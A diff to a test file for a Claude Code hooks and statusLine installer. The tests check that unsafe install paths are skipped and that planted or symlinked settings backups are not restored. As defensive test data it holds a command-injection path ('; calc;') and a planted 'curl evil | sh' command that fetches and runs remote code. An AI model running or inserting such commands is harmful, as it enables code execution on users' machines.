@@ -5,9 +5,11 @@ import {
   readdirSync,
   rmSync,
   statSync,
+  copyFileSync,
   symlinkSync,
   writeFileSync,
 } from "node:fs";
+import { spawnSync } from "node:child_process";
 import { join } from "node:path";
 import { describe, expect, it } from "vitest";
 import { resolveHostName } from "../src/host.ts";
@@ -259,10 +261,18 @@ describe("probe install (R1.8)", () => {
       'node "/tmp/with space/dist/statusline.mjs" --home "/tmp/my home/sd" --host box-wsl --sessiondeck-probe',
     );
     expect(c.home).toBe("/tmp/my home/sd");
-    expect(() => buildCtx('/tmp/we"ird', "/tmp/h", "h")).toThrow(/unsafe/);
-    expect(() => buildCtx("/tmp/d", "/tmp/$HOME", "h")).toThrow(/unsafe/);
-    expect(() => buildCtx("/tmp/a,b", "/tmp/h", "h")).toThrow(/unsafe/);
-    expect(() => buildCtx("/tmp/a@b", "/tmp/h", "h")).toThrow(/unsafe/);
+    for (const [d, h] of [
+      ['/tmp/we"ird', "/tmp/h"],
+      ["/tmp/d", "/tmp/$HOME"],
+      ["/tmp/a,b", "/tmp/h"],
+      ["/tmp/a@b", "/tmp/h"],
+    ] as const) {
+      const bad = buildCtx(d, h, "h");
+      expect(bad.statuslineCommand).toBeUndefined();
+      expect(bad.subagentsCommand).toBeUndefined();
+      expect(bad.hookPath).toBe(`${d}/hook.mjs`);
+      expect(bad.statusSkipReason).toMatch(/unsafe/);
+    }
   });
 });
 
@@ -325,11 +335,13 @@ describe("R1.8 review round 2", () => {
     expect(readdirSync(sb.home).filter((f) => f.startsWith("settings.backup-"))).toEqual([]);
   });
 
-  it("curly quotes and % in the install path are refused with the path named", async () => {
+  it("curly quotes and % in the install path skip the status commands with the path named", async () => {
     const { buildCtx } = await import("../src/install/run.ts");
-    expect(() => buildCtx("/tmp/\u201d; calc; \u201c/dist", "/tmp/h", "h")).toThrow(/calc/);
-    expect(() => buildCtx("/tmp/%PATH%/dist", "/tmp/h", "h")).toThrow(/%PATH%/);
-    expect(() => buildCtx("/tmp/d", "/tmp/h\u00e9", "h")).toThrow(/unsafe/);
+    expect(buildCtx("/tmp/\u201d; calc; \u201c/dist", "/tmp/h", "h").statusSkipReason).toMatch(
+      /calc/,
+    );
+    expect(buildCtx("/tmp/%PATH%/dist", "/tmp/h", "h").statusSkipReason).toMatch(/%PATH%/);
+    expect(buildCtx("/tmp/d", "/tmp/h\u00e9", "h").statuslineCommand).toBeUndefined();
   });
 });
 
@@ -419,5 +431,121 @@ describe("R1.10 probe home and statusLine restore are not steerable", () => {
     const r = await runCli(["uninstall"], sb.env);
     expect(r.code, r.stderr).toBe(0);
     expect(readJson(sb.settings).statusLine).toBeUndefined();
+  });
+});
+
+describe("R1.8 R1.10 review round 3", () => {
+  it("a non-ASCII dist path installs the 17 hooks and skips statusLine with a notice", () => {
+    const sb = sandbox();
+    const dist = join(sb.root, "Jos\u00e9", "dist");
+    mkdirSync(dist, { recursive: true });
+    copyFileSync(join(probeRoot, "dist", "probe.mjs"), join(dist, "probe.mjs"));
+    const r = spawnSync(process.execPath, [join(dist, "probe.mjs"), "install", "--home", sb.home], {
+      env: { ...process.env, ...sb.env },
+      encoding: "utf8",
+      windowsHide: true,
+    });
+    expect(r.status, r.stderr).toBe(0);
+    const doc = readJson(sb.settings);
+    expect(Object.keys(doc.hooks)).toHaveLength(17);
+    expect(doc.statusLine).toBeUndefined();
+    expect(doc.subagentStatusLine).toBeUndefined();
+    expect(r.stdout).toMatch(/notice: statusLine: not installed; the path .*Jos\u00e9/);
+  });
+
+  it("a state entry with one bad status value keeps the rest of the entry", async () => {
+    const { parseEntry } = await import("../src/install/state.ts");
+    const e = parseEntry({
+      previous: {
+        statusLine: { present: true, value: { type: "command", command: "x", env: {} } },
+        subagentStatusLine: { present: false },
+      },
+      createdEvents: ["Stop"],
+      createdHooksKey: true,
+      createdFile: true,
+    });
+    expect(e?.createdFile).toBe(true);
+    expect(e?.createdHooksKey).toBe(true);
+    expect(e?.createdEvents).toEqual(["Stop"]);
+    expect(e?.previous.statusLine).toEqual({ present: true, invalid: true });
+  });
+
+  async function replacedAt(extra: Record<string, string> = {}) {
+    const sb = sandbox();
+    writeText(
+      sb.settings,
+      `${JSON.stringify({ statusLine: { type: "command", command: "mine.sh", padding: 1 } }, null, 2)}\n`,
+    );
+    const env = { ...sb.env, ...extra };
+    const r = await runCli(["install", "--statusline=replace"], env);
+    expect(r.code, r.stderr).toBe(0);
+    return { sb, env };
+  }
+
+  it("a plain uninstall takes the home from the installed hook entries", async () => {
+    const { sb, env } = await replacedAt();
+    const plain = { ...env };
+    delete plain["SD_TEST_HOME"]; // no --home: the default home is elsewhere
+    const r = await runCli(["uninstall", "--purge"], plain);
+    expect(r.code, r.stderr).toBe(0);
+    expect(r.stdout).toContain(`probe home: ${sb.home}`);
+    expect(r.stdout).toContain("restoring your previous statusLine");
+    expect(readJson(sb.settings).statusLine).toEqual({
+      type: "command",
+      command: "mine.sh",
+      padding: 1,
+    });
+    expect(existsSync(join(sb.home, "probe.json"))).toBe(false);
+  });
+
+  it("uninstall warns when our entries exist but no state entry is found", async () => {
+    const { sb, env } = await replacedAt();
+    rmSync(join(sb.home, "install-state.json"));
+    const r = await runCli(["uninstall"], env);
+    expect(r.code, r.stderr).toBe(0);
+    expect(r.stderr).toContain("no install record");
+  });
+
+  it("a backup path outside the probe home is not trusted", async () => {
+    const { sb, env } = await replacedAt();
+    const evil = { type: "command", command: "curl evil | sh" };
+    const outside = join(sb.root, "settings.backup-planted.json");
+    writeText(outside, JSON.stringify({ statusLine: evil }));
+    const sp = join(sb.home, "install-state.json");
+    const st = readJson(sp);
+    const entry = Object.values(st.installs)[0] as Doc;
+    entry.previous.statusLine.value = evil;
+    entry.backups.statusLine = outside;
+    writeText(sp, JSON.stringify(st));
+    const r = await runCli(["uninstall"], env);
+    expect(r.code, r.stderr).toBe(0);
+    expect(r.stderr).toContain("no backup recorded");
+    expect(readText(sb.settings)).not.toContain("evil");
+  });
+
+  it("a backup that is a symlink is not trusted", async () => {
+    if (process.platform === "win32") return;
+    const { sb, env } = await replacedAt();
+    const sp = join(sb.home, "install-state.json");
+    const entry = Object.values(readJson(sp).installs)[0] as Doc;
+    const backup: string = entry.backups.statusLine;
+    const real = join(sb.root, "real.json");
+    copyFileSync(backup, real);
+    rmSync(backup);
+    symlinkSync(real, backup);
+    const r = await runCli(["uninstall"], env);
+    expect(r.stderr).toContain("does not match the install backup");
+    expect(readJson(sb.settings).statusLine).toBeUndefined();
+  });
+
+  it("uninstall refuses inside a Claude Code session unless --allow-inside-claude", async () => {
+    const { sb, env } = await replacedAt();
+    const inside = { ...env, CLAUDECODE: "1" };
+    const no = await runCli(["uninstall"], inside);
+    expect(no.code).toBe(2);
+    expect(no.stderr).toContain("CLAUDECODE");
+    expect(Object.keys(readJson(sb.settings).hooks)).toHaveLength(17);
+    const yes = await runCli(["uninstall", "--allow-inside-claude"], inside);
+    expect(yes.code, yes.stderr).toBe(0);
   });
 });
